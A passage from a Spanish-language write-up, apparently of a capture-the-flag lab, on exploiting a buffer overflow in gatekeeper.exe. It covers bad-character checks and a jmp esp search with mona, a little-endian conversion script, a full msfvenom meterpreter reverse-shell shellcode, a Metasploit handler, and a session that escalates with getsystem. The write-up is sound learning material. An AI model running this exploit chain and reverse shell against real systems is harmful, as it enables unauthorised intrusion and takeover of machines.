+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">!</span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">compare</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">f</span> <span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">mona</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span><span style="color:#960050;background-color:#1e0010">\\</span><span style="color:#a6e22e">bytearray</span>.<span style="color:#a6e22e">bin</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">ESP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">Memory</span> <span style="color:#a6e22e">comparison</span> <span style="color:#a6e22e">results</span>, <span style="color:#a6e22e">item</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Address</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0x020119f8</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Status</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Corruption</span> <span style="color:#a6e22e">after</span> <span style="color:#ae81ff">9</span> <span style="color:#a6e22e">bytes</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">BadChars</span><span style="color:#f92672">=</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">a</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">normal</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Location</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Stack</span>
+</span></span></code></pre></div><p>Repito el proceso anterior pero esta vez con el caracter \x0a, asegurandome de que esos caracteres no se incluyen en el payload enviado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">!</span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">bytearray</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">b</span> <span style="color:#e6db74">&#34;\x00\x0a&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">!</span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">compare</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">f</span> <span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">mona</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span><span style="color:#960050;background-color:#1e0010">\\</span><span style="color:#a6e22e">bytearray</span>.<span style="color:#a6e22e">bin</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">ESP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">Memory</span> <span style="color:#a6e22e">comparison</span> <span style="color:#a6e22e">results</span>, <span style="color:#a6e22e">item</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Address</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0x009919f8</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Status</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Unmodified</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">BadChars</span><span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Type</span><span style="color:#f92672">=</span><span style="color:#a6e22e">normal</span>
+</span></span><span style="display:flex;"><span> <span style="color:#a6e22e">Location</span><span style="color:#f92672">=</span><span style="color:#a6e22e">Stack</span>
+</span></span></code></pre></div><p>Ahora la comparación no muestra ningún caracter y el status es Unmodified, por lo que puedo asegurar que el caracter \x0a no se puede enviar al binario. Lo siguiente será buscar el punto de salto para poder saltar a mi payload. Para ello, ejecuto el comando !mona jmp -r esp -cpb &ldquo;\x00\x0a&rdquo; para buscar los puntos de salto que no contengan los caracteres \x00 y \x0a. En este caso, el punto de salto que voy a usar es 080414C3.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f92672">!</span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">jmp</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#a6e22e">esp</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">cpb</span> <span style="color:#e6db74">&#34;\x00\x0a&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   <span style="color:#f92672">!</span><span style="color:#a6e22e">mona</span> <span style="color:#a6e22e">jmp</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#a6e22e">esp</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">cpb</span> <span style="color:#e6db74">&#34;\x00\x0a&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>           <span style="color:#f92672">----------</span> <span style="color:#a6e22e">Mona</span> <span style="color:#a6e22e">command</span> <span style="color:#a6e22e">started</span> <span style="color:#a6e22e">on</span> <span style="color:#ae81ff">2023</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">22</span><span style="color:#f92672">:</span><span style="color:#ae81ff">27</span><span style="color:#f92672">:</span><span style="color:#ae81ff">39</span> (<span style="color:#a6e22e">v2</span><span style="color:#ae81ff">.0</span>, <span style="color:#a6e22e">rev</span> <span style="color:#ae81ff">634</span>) <span style="color:#f92672">----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   [<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Processing</span> <span style="color:#a6e22e">arguments</span> <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">criteria</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> <span style="color:#a6e22e">Pointer</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">level</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">X</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> <span style="color:#a6e22e">Bad</span> <span style="color:#66d9ef">char</span> <span style="color:#a6e22e">filter</span> <span style="color:#a6e22e">will</span> <span style="color:#a6e22e">be</span> <span style="color:#a6e22e">applied</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">pointers</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;\x00\x0a&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   [<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Generating</span> <span style="color:#a6e22e">module</span> <span style="color:#a6e22e">info</span> <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">hang</span> <span style="color:#a6e22e">on</span>...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> <span style="color:#a6e22e">Processing</span> <span style="color:#a6e22e">modules</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> <span style="color:#a6e22e">Done</span>. <span style="color:#a6e22e">Let</span><span style="color:#e6db74">&#39;s rock &#39;</span><span style="color:#a6e22e">n</span> <span style="color:#a6e22e">roll</span>.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   [<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Querying</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">modules</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> <span style="color:#a6e22e">Querying</span> <span style="color:#a6e22e">module</span> <span style="color:#a6e22e">gatekeeper</span>.<span style="color:#a6e22e">exe</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">74950000</span>   <span style="color:#a6e22e">Modules</span> <span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">Windows</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">System32</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">wshtcpip</span>.<span style="color:#a6e22e">dll</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> <span style="color:#a6e22e">Search</span> <span style="color:#a6e22e">complete</span>, <span style="color:#a6e22e">processing</span> <span style="color:#a6e22e">results</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   [<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Preparing</span> <span style="color:#a6e22e">output</span> <span style="color:#a6e22e">file</span> <span style="color:#e6db74">&#39;jmp.txt&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> (<span style="color:#a6e22e">Re</span>)<span style="color:#a6e22e">setting</span> <span style="color:#a6e22e">logfile</span> <span style="color:#a6e22e">c</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">mona</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">jmp</span>.<span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   [<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Writing</span> <span style="color:#a6e22e">results</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">c</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">mona</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">jmp</span>.<span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#f92672">-</span> Number <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">pointers</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">type</span> <span style="color:#e6db74">&#39;jmp esp&#39;</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>   [<span style="color:#f92672">+</span>] <span style="color:#a6e22e">Results</span> <span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">080414</span><span style="color:#a6e22e">C3</span>     <span style="color:#ae81ff">0x080414c3</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">jmp</span> <span style="color:#a6e22e">esp</span> <span style="color:#f92672">|</span>  {<span style="color:#a6e22e">PAGE_EXECUTE_READ</span>} [<span style="color:#a6e22e">gatekeeper</span>.<span style="color:#a6e22e">exe</span>] <span style="color:#a6e22e">ASLR</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">Rebase</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">SafeSEH</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">True</span>, <span style="color:#a6e22e">CFG</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">OS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">v</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">-</span> (<span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">bof</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span>.<span style="color:#a6e22e">exe</span>), <span style="color:#ae81ff">0x8000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">080416</span><span style="color:#a6e22e">BF</span>     <span style="color:#ae81ff">0x080416bf</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">jmp</span> <span style="color:#a6e22e">esp</span> <span style="color:#f92672">|</span>  {<span style="color:#a6e22e">PAGE_EXECUTE_READ</span>} [<span style="color:#a6e22e">gatekeeper</span>.<span style="color:#a6e22e">exe</span>] <span style="color:#a6e22e">ASLR</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">Rebase</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">SafeSEH</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">True</span>, <span style="color:#a6e22e">CFG</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">OS</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">False</span>, <span style="color:#a6e22e">v</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">-</span> (<span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">bof</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">gatekeeper</span>.<span style="color:#a6e22e">exe</span>), <span style="color:#ae81ff">0x8000</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">BADF00D</span>       <span style="color:#a6e22e">Found</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">total</span> <span style="color:#66d9ef">of</span> <span style="color:#ae81ff">2</span> <span style="color:#a6e22e">pointers</span>
+</span></span></code></pre></div><p>Identifico dos puntos de salto. Me quedo con uno de ellos y me lo llevo para usarlo en mi exploit. Lo paso por un pequeño script de python para obtener el valor en little endian.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Run:</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">jump_address.py &lt;jump_point_address&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>address <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n1 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>n2 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>n3 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>]
+</span></span><span style="display:flex;"><span>n4 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">retn =  &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n4 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n3 <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n2 <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n1<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ python3 jump.py 080414C3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;\xC3\x14\x04\x08&#34;</span>
+</span></span></code></pre></div><p>Con el valor del punto de salto, actualizo el script de python y compruebo que puedo saltar a mi payload. En el registro EIP se puede ver el valor 080414C3 que es el punto de salto que he usado en el payload.</p>
+<h2 id="prueba-del-exploit">Prueba del exploit</h2>
+<p>Antes de atacar la máquina objetivo, voy a probar con mi máquina de pruebas. Usando msfvenom, genero un payload de meterpreter que se conecte a mi equipo en el puerto 4444 y lo meto en el script del exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.56.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>process -b <span style="color:#e6db74">&#34;\x00\xa0&#34;</span> -f c
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">12</span> compatible encoders
+</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
+</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">1632</span> bytes
+</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbf\xe1\xb8\x2d\x7c\xdd\xc6\xd9\x74\x24\xf4\x5b\x2b\xc9&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb1\x59\x31\x7b\x14\x83\xeb\xfc\x03\x7b\x10\x03\x4d\xd1&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x94\x4c\xae\x2a\x65\x32\x9e\xf8\x01\x39\xb2\xcc\x42\x6f&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x3f\xa6\x07\x9b\xb6\x5d\xa8\x14\x82\xbb\x3c\x28\x3b\xf5&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbd\xfd\xfb\x59\x7d\x9c\x87\xa3\x52\x7e\xb9\x6b\xa7\x7f&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xfe\x3d\xcd\x90\x52\xe9\xa6\x3c\x43\x9e\xfb\xfc\x62\x70&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x70\xbc\x1c\xf5\x47\x48\x91\xf4\x97\x3b\x61\xef\x9c\x63&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x52\x0e\x70\xc3\x17\xd9\x02\xdf\x5e\xeb\x15\x94\x55\x80&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xeb\x7c\xa4\x56\x2a\x4f\xca\xfa\xac\x88\xed\xe2\xda\xe2&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0d\x9e\xdc\x31\x6f\x44\x68\xa5\xd7\x0f\xca\x01\xe9\xdc&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x8d\xc2\xe5\xa9\xda\x8c\xe9\x2c\x0e\xa7\x16\xa4\xb1\x67&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x9f\xfe\x95\xa3\xfb\xa5\xb4\xf2\xa1\x08\xc8\xe4\x0e\xf4&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x6c\x6f\xbc\xe3\x11\x90\x3e\x0c\x4c\x06\xf2\xc1\x6f\xd6&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x9c\x52\x03\xe4\x03\xc9\x8b\x44\xcb\xd7\x4c\xdd\xdb\xe7&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x83\x65\x8b\x19\x24\x95\x85\xdd\x70\xc5\xbd\xf4\xf8\x8e&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x3d\xf8\x2c\x3a\x34\x6e\x0f\x12\x70\x6f\xe7\x60\x81\x7e&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xab\xed\x67\xd0\x03\xbd\x37\x91\xf3\x7d\xe8\x79\x1e\x72&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xd7\x9a\x21\x59\x70\x30\xce\x37\x28\xad\x77\x12\xa2\x4c&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x77\x89\xce\x4f\xf3\x3b\x2e\x01\xf4\x4e\x3c\x76\x63\xb0&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbc\x87\x06\xb0\xd6\x83\x80\xe7\x4e\x8e\xf5\xcf\xd0\x71&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xd0\x4c\x16\x8d\xa5\x64\x6c\xb8\x33\xc8\x1a\xc5\xd3\xc8&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xda\x93\xb9\xc8\xb2\x43\x9a\x9b\xa7\x8b\x37\x88\x7b\x1e&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb8\xf8\x28\x89\xd0\x06\x16\xfd\x7e\xf9\x7d\x7d\x78\x05&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x03\xaa\x21\x6d\xfb\xea\xd1\x6d\x91\xea\x81\x05\x6e\xc4&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x2e\xe5\x8f\xcf\x66\x6d\x05\x9e\xc5\x0c\x1a\x8b\x88\x90&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x1b\x38\x11\x23\x61\x31\xa6\xc4\x96\x5b\xc3\xc5\x96\x63&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xf5\xfa\x40\x5a\x83\x3d\x51\xd9\x9c\x08\xf4\x48\x37\x72&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xaa\x8b\x12&#34;</span>;
+</span></span></code></pre></div><p>Pongo en marcha el listener de metasploit y lanzo el exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/handler 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload generic/shell_reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set payload windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; windows/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; set lhost 192.168.56.1
+</span></span><span style="display:flex;"><span>lhost <span style="color:#f92672">=</span>&gt; 192.168.56.1
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; show options 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/handler<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name  Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----  ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>windows/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name      Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----      ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   EXITFUNC  process          yes       Exit technique <span style="color:#f92672">(</span>Accepted: <span style="color:#e6db74">&#39;&#39;</span>, seh, thread, process, none<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LHOST     192.168.56.1     yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT     <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Wildcard Target
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.56.1:4444 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">175686</span> bytes<span style="color:#f92672">)</span> to 192.168.56.101
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.56.1:4444 -&gt; 192.168.56.101:49426<span style="color:#f92672">)</span> at 2023-10-01 22:35:32 +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: usuario-PC<span style="color:#ae81ff">\u</span>suario
+</span></span><span style="display:flex;"><span>meterpreter &gt; getsystem
+</span></span><span style="display:flex;"><span>...got system via technique <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>Named Pipe Impersonation <span style="color:#f92672">(</span>In Memory/Admin<span style="color:#f92672">))</span>.
+</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
